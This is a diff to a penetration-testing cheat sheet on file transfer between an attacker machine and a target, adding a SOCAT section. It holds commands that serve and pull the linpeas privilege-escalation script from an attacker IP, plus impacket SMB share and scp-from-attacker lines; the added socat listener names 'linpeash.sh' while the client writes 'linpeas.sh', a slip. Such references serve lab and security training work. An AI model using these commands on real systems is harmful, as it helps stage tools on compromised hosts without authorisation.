@@ -151,7 +151,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
 
-Or create a **smb **share **using samba**:
+Or create a \*\*smb \*\*share **using samba**:
 
 ```bash
 apt-get install samba
@@ -184,6 +184,13 @@ The attacker has to have SSHd running.
 
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename> 
+```
+
+## SOCAT
+
+```shell
+sudo socat TCP4-LISTEN:443,fork file:linpeash.sh
+socat TCP4:10.10.14.9:443 file:linpeas.sh,create
 ```
 
 ## NC
